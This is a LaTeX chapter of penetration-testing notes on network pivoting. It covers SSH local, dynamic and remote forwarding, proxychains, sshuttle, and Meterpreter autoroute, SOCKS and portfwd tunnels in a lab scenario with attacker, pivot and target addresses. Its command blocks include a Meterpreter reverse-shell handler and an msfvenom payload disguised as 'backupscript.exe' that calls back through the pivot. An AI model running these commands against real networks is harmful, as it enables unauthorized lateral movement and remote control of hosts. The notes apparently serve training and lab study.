\section{Port forwarding}

Port forwarding is a technique that allows to redirect a communication request
from one port to another. Port forwarding uses TCP as the primary communication
layer to provide interactive communication for the forwarded port. However,
different application layer protocols such as SSH or even
\href{https://en.wikipedia.org/wiki/SOCKS}{SOCKS} (non-application layer) can
be used to encapsulate the forwarded traffic. This can be effective in
bypassing firewalls and using existing services on compromised host to pivot to
other networks.

The reason SSH port forwarding is so
popular is because SSH client-server session provides most of the requirements
for network traffic, so port forwarding is a logical extension of the SSH
functionality.


\subsection{SSH Port Forwarding}
SSH port forwarding is a feature of SSH protocol that allows client and server
to forward additional network connections using base SSH session as a secure,
encrypted and compressed (for improved performance) tunnel.

SSH port forwarding is just a specific SSH-based implementation of a
bigger concept: port forwarding in general helps you get around rigid network
and firewall structures by allowing bi-directional specific network
connectivity via certain network ports. 

SSH port forwarding involves establishing an SSH tunnel between two or more
systems and then configuring the systems to transmit a specified type of
traffic through that connection.

\subsubsection{Local port forwarding}
Local port forwarding is used to make an external resource available on the
local network.  For example a SQL server only allowing localhost connexion


Local forwarding is used to forward a port from the client machine to the
server machine. Basically, the SSH client listens for connections on a
configured port, and when it receives a connection, it tunnels the connection
to an SSH server. The server connects to a configurated destination port,
possibly on a different machine than the SSH server.

\begin{verbatim}
ssh -L $LPORT:localhost:RPORT $LOGIN@$RHOST

netstat -antp | grep $LPORT
lsof -i | egrep '\<ssh\>'
lsof -i -n | egrep '\<ssh\>'

nmap -v -sV -p$LPORT localhost
\end{verbatim}

{\emph Autossh} is a tool that can be used to create persistent SSH tunnels. The only
prerequisite is that you need to have public key authentication configured
between your systems unless you want to be prompted for a password every time
the connection dies and is re-established.



\subsubsection{Dynamic port forwarding}

Dynamic port forwarding, also called This is called \emph{SSH tunneling over SOCKS
proxy}, sets up a SOCKS proxy server. You can configure
applications to connect to the proxy and transmit all data through it. The most
common use for this is for private web browsing or to make your connection
seemingly originate from a different country or location.

\begin{figure}
  \includegraphics[width=\linewidth]{misc/pivoting/images/dynamic_ssh.png}
  \caption{Dynamic port forwarding}
  \label{fig:dynamic_port_ssh}
\end{figure}


\begin{verbatim}
ssh -D $LPORT $LOGIN@$RHOST
\end{verbatim}

\href{https://github.com/haad/proxychains}{proxychains} ProxyChains is a UNIX
program, that hooks network-related libc functions in dynamically linked
programs via a preloaded DLL and redirects the connections through SOCKS4a/5 or
HTTP proxies.

edit \verb+/etc/proxychains.conf+
\begin{verbatim}
socks4 	127.0.0.1 $LPORT
\end{verbatim}


Then it is possible to route traffic of application not allowing proxy usage
such as nmap metsaploit, xfreerdp
\begin{verbatim}
proxychains nmap -v -sn 172.16.5.1-200
proxychains msfconsole
proxychains xfreerdp /v:$TARGET /u:$LOGIN /p:$PASSWORD
\end{verbatim}


 One more important note to remember here is that we can only perform a
 \emph{full TCP connect} (\verb+sT+) scan over proxychains.

\subsubsection{Remote port forwarding}
Remote port forwarding is the exact opposite. An SSH tunnel is established, but
the remote system is able to access your local network.


Usefull  to get a reverse shell through a pivot tunnel.

see \verb+GatewayPorts+ config.

\begin{verbatim}
ssh -R $RIP:$RPORT:$LIP:$LPORT user@hostname.com -vN
\end{verbatim}

if \verb+RIP+ (or \verb+0.0.0.0+) is omited will listen on all IP


\subsubsection{SSH Server-Side Config}
The \verb+AllowTcpForwarding+ option in the OpenSSH server configuration file
must be enabled on the server to allow port forwarding. By default, forwarding
is allowed. Possible values for this option are \verb+yes+ or \verb+all+ to
allow all TCP forwarding, \verb+no+ to prevent all TCP forwarding, \verb+local+
to allow local forwardings, and \verb+remote+ to allow remote forwardings.

Another option of interest is \verb+AllowStreamLocalForwarding+, which can be
used to forward Unix domain sockets. It allows the same values as
AllowTcpForwarding. The default is \verb+yes+.

The \verb+GatewayPorts+ configuration option also affects remote port
forwardings. Possible values were \verb+no+ (only local connections from server
host allowed; default), \verb+yes+ (anyone on the Internet can connect to
remote forwarded ports), and \verb+clientspecified+ (client can specify an IP address that can connect, anyone can if not specified).


\verb+PermitOpen+ can be used to specify the destinations to which port forwarding is allowed. If you only want to allow forwarding to certain IP addresses or hostnames, use this directive. 

\subsubsection{Low latency}

The only real problem that arises with SSH port forwarding is that there is
usually a bit of latency.  The problem becomes more apparent when doing
network-intensive activities, especially with port forwarding set up as a SOCKS proxy server.

The reason for the latency is because SSH is tunneling TCP over TCP. This is a
terribly inefficient way to transfer data and will result in slower network
speeds.

There is a program called \href{https://github.com/sshuttle/sshuttle}{sshuttle} that corrects the issue. It also remove the
need to configure proxychains.

Sshuttle can be extremely useful for automating the execution of iptables and adding pivot rules for the remote host.

iTo use sshuttle, specify the option \verb+-r+ to connect to the remote machine
with a username and password. Then we include the network or IP we want to
route through the pivot host (for example the network 172.16.5.0/23).

With this command, sshuttle creates an entry in our iptables to redirect all
traffic to the 172.16.5.0/23 network through the pivot host.

\begin{verbatim}
sudo sshuttle -r $USER@RIP -x 172.16.5.0 -vv
\end{verbatim}

\subsection{Meterpreter Tunneling and Port Forwarding}

scenario :
\begin{itemize}
    \item attacker: 10.10.14.18
    \item pivot: (10.10.x.x, 172.16.5.129)
    \item target: 172.16.5.19
\end{itemize}


\subsubsection{Dynamic port forwarding}
With a meterpreter session on the pivot host

\begin{verbatim}
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
\end{verbatim}

Configuring MSF's SOCKS Proxy

\begin{verbatim}
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run
# confirm
jobs
\end{verbatim}

After initiating the SOCKS server,configure proxychains
(\verb+/etc/proxychains.conf+) to route traffic generated by other tools like
Nmap through the pivot.

Finally, tell socks proxy module to route all the traffic via
Meterpreter session with the \verb+post/multi/manage/autoroute+ module to add
routes for the 172.16.5.0 subnet and then route all our proxychains traffic.

\begin{verbatim}
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run
\end{verbatim}

It is also possible to add routes with autoroute by running autoroute from the
Meterpreter session.

\begin{verbatim}
meterpreter > run autoroute -s 172.16.5.0/23

# list active routes
meterpreter > run autoroute -p
\end{verbatim}

testing
\begin{verbatim}
 proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
\end{verbatim}


\subsubsection{Local port forwarding}
Request Meterpreter to forward all the packets received on this port via 
Meterpreter session to a remote host on the 172.16.5.0/23 network.

Creating Local TCP Relay: attacker host port 3300 to  target (172.16.5.19) 3389
port thu pivot host runing the meterpreter.

\begin{verbatim}
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
\end{verbatim}

validate 
\begin{verbatim}
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
\end{verbatim}

\subsubsection{Remote port forwarding}
Create a reverse port forward on existing shell from the previous scenario to
forwards all connections on port 1234 running on the pivot to attack host on local port 8081.

\begin{verbatim}
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
meterpreter > bg
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
sf6 exploit(multi/handler) > run

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234

\end{verbatim}




\subsection{ Tunnel as http proxy with ncat}

ncat can be setup as an http proxy which can be used similar to a socks proxy. Just run the ncat proxy on the target machine, and update the local proxychains config to use an http proxy.

Unfortunately, ncat is almost never going to be installed by default on a target machine, unless someone has also installed nmap there.
\subsubsection{Target machine - setup ncat listener}
\begin{verbatim}
ncat -vv --listen 3128 --proxy-type http
\end{verbatim}
\subsubsection{attacker machine}
\begin{verbatim}
tail /etc/proxychains.conf -n 3
# defaults set to "tor"
#socks4 	127.0.0.1 9050
http 172.21.0.3  3128 # 172.21.0.3 is the IP of my ssh machine

proxychains nmap -sT -P0 -p8080,9001 172.20.0.2
\end{verbatim}

